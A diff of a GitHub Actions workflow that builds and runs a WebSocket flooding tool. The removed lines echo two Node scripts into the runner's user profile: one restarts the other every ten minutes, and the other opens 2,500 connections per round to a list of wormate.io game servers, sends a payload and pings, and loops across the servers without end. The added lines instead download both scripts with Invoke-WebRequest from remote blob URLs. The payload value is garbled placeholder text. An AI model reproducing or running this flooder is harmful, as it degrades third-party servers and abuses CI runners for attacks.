@@ -28,77 +28,10 @@ jobs:
       with:
         node-version: '20'
 
-    - name: Create klo.js and all2.js files
+    - name: Download klo.js and all2.js from remote URLs
       run: |
-        echo const { spawn } = require('child_process'); > $env:USERPROFILE\klo.js
-        echo. >> $env:USERPROFILE\klo.js
-        echo function runScript() { >> $env:USERPROFILE\klo.js
-        echo   console.log(`Starting all.js at ${new Date().toLocaleTimeString()}`); >> $env:USERPROFILE\klo.js
-        echo   const child = spawn('node', ['all2.js'], { stdio: 'inherit' }); >> $env:USERPROFILE\klo.js
-        echo   setTimeout(() => { >> $env:USERPROFILE\klo.js
-        echo     console.log(`estarting all.js at ${new Date().toLocaleTimeString()}`); >> $env:USERPROFILE\klo.js
-        echo     child.kill(); >> $env:USERPROFILE\klo.js
-        echo     runScript(); >> $env:USERPROFILE\klo.js
-        echo   }, 10 * 60 * 1000); >> $env:USERPROFILE\klo.js
-        echo } >> $env:USERPROFILE\klo.js
-        echo. >> $env:USERPROFILE\klo.js
-        echo runScript(); >> $env:USERPROFILE\klo.js
-
-        echo const WebSocket = require('ws'); > $env:USERPROFILE\all2.js
-        echo. >> $env:USERPROFILE\all2.js
-        echo const SERVER_URLS = [ >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32053/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32609/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32103/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32064/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32708/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32285/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32017/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32095/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:31050/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:31280/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32044/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32249/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:30377/wormy', >> $env:USERPROFILE\all2.js
-        echo   'wss://fra-c.wormate.io:32262/wormy' >> $env:USERPROFILE\all2.js
-        echo ]; >> $env:USERPROFILE\all2.js
-        echo. >> $env:USERPROFILE\all2.js
-        echo const hexPayload = '<<ط­ط· ظ‡ظ†ط§ ط§ظ„ط¨ط§ظٹظ„ظˆط¯>>'; >> $env:USERPROFILE\all2.js
-        echo const BOT_COUNT = 2500; >> $env:USERPROFILE\all2.js
-        echo const buffer = Buffer.from(hexPayload.replace(/[^a-fA-F0-9]/g, ''), 'hex'); >> $env:USERPROFILE\all2.js
-        echo const pingPayload = Buffer.from([0x00]); >> $env:USERPROFILE\all2.js
-        echo let currentServerIndex = 0; >> $env:USERPROFILE\all2.js
-        echo async function sendBotsToServer(url) { >> $env:USERPROFILE\all2.js
-        echo   console.log(`\nclosing ${url}`); >> $env:USERPROFILE\all2.js
-        echo   return new Promise((resolve) => { >> $env:USERPROFILE\all2.js
-        echo     let sentCount = 0; >> $env:USERPROFILE\all2.js
-        echo     let closedCount = 0; >> $env:USERPROFILE\all2.js
-        echo     for (let i = 0; i < BOT_COUNT; i++) { >> $env:USERPROFILE\all2.js
-        echo       const ws = new WebSocket(url); >> $env:USERPROFILE\all2.js
-        echo       ws.on('open', () => { >> $env:USERPROFILE\all2.js
-        echo         ws.send(buffer); >> $env:USERPROFILE\all2.js
-        echo         sentCount++; >> $env:USERPROFILE\all2.js
-        echo         const interval = setInterval(() => { >> $env:USERPROFILE\all2.js
-        echo           if (ws.readyState === WebSocket.OPEN) { ws.send(pingPayload); } else { clearInterval(interval); } >> $env:USERPROFILE\all2.js
-        echo         }, 1000); >> $env:USERPROFILE\all2.js
-        echo         if (sentCount %% 500 === 0 || sentCount === BOT_COUNT) { >> $env:USERPROFILE\all2.js
-        echo           console.log(`closing payload #${sentCount} to ${url}`); >> $env:USERPROFILE\all2.js
-        echo         } >> $env:USERPROFILE\all2.js
-        echo       }); >> $env:USERPROFILE\all2.js
-        echo       const finish = () => { closedCount++; if (closedCount === BOT_COUNT) resolve(); }; >> $env:USERPROFILE\all2.js
-        echo       ws.on('error', finish); >> $env:USERPROFILE\all2.js
-        echo       ws.on('close', finish); >> $env:USERPROFILE\all2.js
-        echo     } >> $env:USERPROFILE\all2.js
-        echo   }); >> $env:USERPROFILE\all2.js
-        echo } >> $env:USERPROFILE\all2.js
-        echo async function loopForever() { >> $env:USERPROFILE\all2.js
-        echo   while (true) { >> $env:USERPROFILE\all2.js
-        echo     const url = SERVER_URLS[currentServerIndex]; >> $env:USERPROFILE\all2.js
-        echo     await sendBotsToServer(url); >> $env:USERPROFILE\all2.js
-        echo     currentServerIndex = (currentServerIndex + 1) %% SERVER_URLS.length; >> $env:USERPROFILE\all2.js
-        echo   } >> $env:USERPROFILE\all2.js
-        echo } >> $env:USERPROFILE\all2.js
-        echo loopForever(); >> $env:USERPROFILE\all2.js
+        Invoke-WebRequest -Uri "blob:https://970-cs-578782249504-default.cs-europe-west1-iuzs.cloudshell.dev/68ffd817-ca66-448a-887c-95811d8eb0f0" -OutFile "$env:USERPROFILE\klo.js"
+        Invoke-WebRequest -Uri "blob:https://970-cs-578782249504-default.cs-europe-west1-iuzs.cloudshell.dev/e92f5674-d462-4770-92b4-dfe798b46c08" -OutFile "$env:USERPROFILE\all2.js"
 
 
     - name: Create desktop shortcut for klo.js
